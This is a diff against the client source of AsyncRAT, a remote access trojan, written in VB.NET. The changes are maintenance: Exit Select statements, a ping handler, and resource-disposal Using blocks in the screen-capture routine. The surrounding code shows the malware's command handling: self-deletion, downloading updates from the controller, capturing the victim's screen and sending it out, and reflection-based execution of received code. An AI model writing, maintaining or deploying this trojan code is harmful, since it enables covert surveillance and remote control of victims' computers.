@@ -289,7 +289,6 @@ Namespace AsyncRAT
             Try
                 If isConnected = True Then
                     Send(CByte(PacketHeader.Ping))
-                    Debug.WriteLine("Pinged!")
                 End If
             Catch ex As Exception
             End Try
@@ -311,6 +310,7 @@ Namespace AsyncRAT
                         Catch ex As Exception
                         End Try
                         Environment.Exit(0)
+                        Exit Select
 
                     Case PacketHeader.ClientDelete
                         SelfDelete()
@@ -318,16 +318,24 @@ Namespace AsyncRAT
                     Case PacketHeader.ClientUpdate
                         Program.Send(CByte(PacketHeader.MsgReceived))
                         Download(itm(1), itm(2), itm(3))
+                        Exit Select
 
                     Case PacketHeader.RemoteDesktopOpen
                         Program.Send(CByte(PacketHeader.RemoteDesktopOpen))
+                        Exit Select
 
                     Case PacketHeader.RemoteDesktopSend
                         Capture(itm(1), itm(2))
+                        Exit Select
 
                     Case PacketHeader.Reflection
                         Program.Send(CByte(PacketHeader.MsgReceived))
                         Reflection(itm(1))
+                        Exit Select
+
+                    Case PacketHeader.Ping
+                        Debug.WriteLine("Server just pinged me")
+                        Exit Select
 
                 End Select
 
@@ -412,46 +420,41 @@ Namespace AsyncRAT
         Public Shared Sync As Object = New Object
         Public Shared Sub Capture(ByVal W As Integer, ByVal H As Integer)
             SyncLock Sync
-
                 Try
                     'Capture
-                    Dim ScreenSize As New Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
-                    Dim ImageScreenSize As Graphics = Graphics.FromImage(ScreenSize)
-                    ImageScreenSize.CompositingQuality = CompositingQuality.HighSpeed
-                    ImageScreenSize.CopyFromScreen(0, 0, 0, 0, New Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), CopyPixelOperation.SourceCopy)
+                    Using ScreenSize As New Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
+                        Using ImageScreenSize As Graphics = Graphics.FromImage(ScreenSize)
+                            ImageScreenSize.CompositingQuality = CompositingQuality.HighSpeed
+                            ImageScreenSize.CopyFromScreen(0, 0, 0, 0, New Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), CopyPixelOperation.SourceCopy)
+                        End Using
 
-                    'Resize
-                    Dim Resize As New Bitmap(W, H)
-                    Dim ImageResize As Graphics = Graphics.FromImage(Resize)
-                    ImageResize.CompositingQuality = CompositingQuality.HighSpeed
-                    ImageResize.DrawImage(ScreenSize, New Rectangle(0, 0, W, H), New Rectangle(0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), GraphicsUnit.Pixel)
+                        'Resize
+                        Using Resize As New Bitmap(W, H)
+                            Using ImageResize As Graphics = Graphics.FromImage(Resize)
+                                ImageResize.CompositingQuality = CompositingQuality.HighSpeed
+                                ImageResize.DrawImage(ScreenSize, New Rectangle(0, 0, W, H), New Rectangle(0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), GraphicsUnit.Pixel)
+                            End Using
 
-                    'compress
-                    Dim encoderParameter As EncoderParameter = New EncoderParameter(Imaging.Encoder.Quality, 50)
-                    Dim encoderInfo As ImageCodecInfo = GetEncoderInfo(ImageFormat.Jpeg)
-                    Dim encoderParameters As EncoderParameters = New EncoderParameters(1)
-                    encoderParameters.Param(0) = encoderParameter
 
-                    Dim MS As New MemoryStream
-                    Resize.Save(MS, encoderInfo, encoderParameters)
 
-                    Program.Send(CByte(PacketHeader.RemoteDesktopSend), MS.GetBuffer)
-
-                    Try
-                        MS.Dispose()
-                        ImageScreenSize.Dispose()
-                        ImageResize.Dispose()
-                        Resize.Dispose()
-                        ScreenSize.Dispose()
-                    Catch ex As Exception
-                        Debug.WriteLine("Capture.Dispose" + ex.Message)
-                    End Try
+                            'compress
+                            Using encoderParameter As EncoderParameter = New EncoderParameter(Imaging.Encoder.Quality, 50)
+                                Dim encoderInfo As ImageCodecInfo = GetEncoderInfo(ImageFormat.Jpeg)
+                                Using encoderParameters As EncoderParameters = New EncoderParameters(1)
+                                    encoderParameters.Param(0) = encoderParameter
+                                    Using MS As New MemoryStream
+                                        Resize.Save(MS, encoderInfo, encoderParameters)
+                                        Program.Send(CByte(PacketHeader.RemoteDesktopSend), MS.GetBuffer)
+                                    End Using
+                                End Using
+                            End Using
+                        End Using
+                    End Using
 
                 Catch ex As Exception
                     Debug.WriteLine("Capture" + ex.Message)
                 End Try
             End SyncLock
-
         End Sub
 
         Private Shared Function GetEncoderInfo(ByVal format As ImageFormat) As ImageCodecInfo
@@ -467,9 +470,9 @@ Namespace AsyncRAT
                     End If
                     j += 1
                 End While
-                Return Nothing
             Catch ex As Exception
             End Try
+            Return Nothing
         End Function
 
     End Class
@@ -514,6 +517,7 @@ Namespace AsyncRAT
                 Return DESEncrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
             Catch ex As Exception
             End Try
+            Return Nothing
         End Function
 
         Function AES_Decryptor(ByVal input As Byte()) As Byte()
@@ -527,6 +531,7 @@ Namespace AsyncRAT
                 Return DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
             Catch ex As Exception
             End Try
+            Return Nothing
         End Function
     End Module
 
